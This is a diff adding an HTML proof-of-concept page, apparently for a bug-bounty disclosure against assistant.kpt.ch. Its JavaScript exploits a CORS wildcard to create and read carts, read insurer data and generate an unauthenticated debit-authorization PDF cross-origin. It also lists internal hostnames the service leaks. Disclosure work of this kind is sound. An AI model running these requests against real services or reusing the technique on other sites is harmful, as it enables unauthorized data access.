@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>KPT assistant.kpt.ch — PoC</title>
+<style>
+body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
+h1 { color: #58a6ff; }
+h2 { color: #f0883e; margin-top: 30px; }
+pre { background: #161b22; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #30363d; }
+.success { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #8b949e; }
+button { background: #238636; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 14px; margin: 5px; }
+button:hover { background: #2ea043; }
+#status { margin: 10px 0; }
+</style>
+</head>
+<body>
+
+<h1>KPT CORS + Infrastructure Disclosure + Unauth PDF — PoC</h1>
+<p class="info">Target: assistant.kpt.ch (*.kpt.ch scope)</p>
+<hr>
+
+<h2>1 — CORS Wildcard: Cross-Origin Cart Read</h2>
+<button onclick="testCartCreate()">Create Cart (POST)</button>
+<button onclick="testCartRead()">Read Cart Data (GET)</button>
+<pre id="cors-result">Click a button to test...</pre>
+
+<h2>2 — CORS Wildcard: Cross-Origin Insurer Data</h2>
+<button onclick="testInsurers()">Read Insurer List</button>
+<pre id="insurer-result">Click to test...</pre>
+
+<h2>3 — Infrastructure Disclosure via Location Header</h2>
+<pre id="infra-result">
+The POST /kpt-api/public/carts response includes:
+
+  Location: https://api-hcf.kpt-intra.ch/offer/v1/api/carts/{uuid}
+
+Leaked info:
+  - Internal domain:  kpt-intra.ch
+  - Service name:     api-hcf
+  - Internal API:     /offer/v1/api/
+
+CSP meta tag also leaks:
+  - Dev domain:       *.kpt-intra-dev.ch
+
+(Location header not readable via JS due to browser redirect handling,
+ but confirmed via curl — see report steps)
+</pre>
+
+<h2>4 — Unauthenticated PDF Generation</h2>
+<button onclick="testPDF()">Generate Debit Authorization PDF</button>
+<pre id="pdf-result">Click to test...</pre>
+
+<script>
+async function testCartCreate() {
+    const el = document.getElementById('cors-result');
+    el.textContent = 'Sending POST to /kpt-api/public/carts from ' + window.location.origin + '...';
+    try {
+        const r = await fetch('https://assistant.kpt.ch/kpt-api/public/carts', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: '{}'
+        });
+        const data = await r.json();
+        el.innerHTML = '<span class="success">[SUCCESS]</span> Cart created cross-origin!\n\n'
+            + 'Status: ' + r.status + '\n'
+            + 'ACAO header: ' + r.headers.get('access-control-allow-origin') + '\n\n'
+            + 'Response:\n' + JSON.stringify(data, null, 2);
+    } catch(e) {
+        el.innerHTML = '<span class="fail">[BLOCKED]</span> ' + e.message;
+    }
+}
+
+async function testCartRead() {
+    const el = document.getElementById('cors-result');
+    el.textContent = 'Sending GET to read cart data...';
+    try {
+        // first create a cart to get a valid UUID
+        const cr = await fetch('https://assistant.kpt.ch/kpt-api/public/carts', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: '{}'
+        });
+        const cart = await cr.json();
+        const cartId = cart.id;
+
+        const r = await fetch('https://assistant.kpt.ch/kpt-api/public/carts/' + cartId);
+        const data = await r.json();
+        el.innerHTML = '<span class="success">[SUCCESS]</span> Cart data read cross-origin!\n\n'
+            + 'Cart ID: ' + cartId + '\n'
+            + 'ACAO: ' + r.headers.get('access-control-allow-origin') + '\n'
+            + 'Expose-Headers: ' + r.headers.get('access-control-expose-headers') + '\n\n'
+            + 'Data:\n' + JSON.stringify(data, null, 2);
+    } catch(e) {
+        el.innerHTML = '<span class="fail">[BLOCKED]</span> ' + e.message;
+    }
+}
+
+async function testInsurers() {
+    const el = document.getElementById('insurer-result');
+    el.textContent = 'Fetching insurer list cross-origin...';
+    try {
+        const r = await fetch('https://assistant.kpt.ch/kpt-api/public/insurers');
+        const data = await r.json();
+        el.innerHTML = '<span class="success">[SUCCESS]</span> ' + data.length + ' insurers read cross-origin!\n\n'
+            + 'ACAO: ' + r.headers.get('access-control-allow-origin') + '\n\n'
+            + 'First 3 entries:\n' + JSON.stringify(data.slice(0, 3), null, 2);
+    } catch(e) {
+        el.innerHTML = '<span class="fail">[BLOCKED]</span> ' + e.message;
+    }
+}
+
+async function testPDF() {
+    const el = document.getElementById('pdf-result');
+    el.textContent = 'Generating debit authorization PDF...';
+    try {
+        const r = await fetch('https://assistant.kpt.ch/kpt-api/public/debitauthorizationforms', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                firstName: 'Max',
+                lastName: 'Muster',
+                street: 'Musterstrasse 1',
+                postalCode: '3000',
+                city: 'Bern',
+                iban: 'CH9300762011623852957'
+            })
+        });
+        if (r.ok) {
+            const blob = await r.blob();
+            const url = URL.createObjectURL(blob);
+            el.innerHTML = '<span class="success">[SUCCESS]</span> Official KPT PDF generated!\n\n'
+                + 'Status: ' + r.status + '\n'
+                + 'Content-Type: ' + r.headers.get('content-type') + '\n'
+                + 'Size: ' + blob.size + ' bytes\n\n'
+                + '<a href="' + url + '" download="KPT-Debit-Authorization.pdf" style="color:#58a6ff">Download PDF</a>';
+        } else {
+            el.innerHTML = '<span class="fail">[FAILED]</span> Status: ' + r.status;
+        }
+    } catch(e) {
+        el.innerHTML = '<span class="fail">[BLOCKED]</span> ' + e.message;
+    }
+}
+</script>
+
+</body>
+</html>
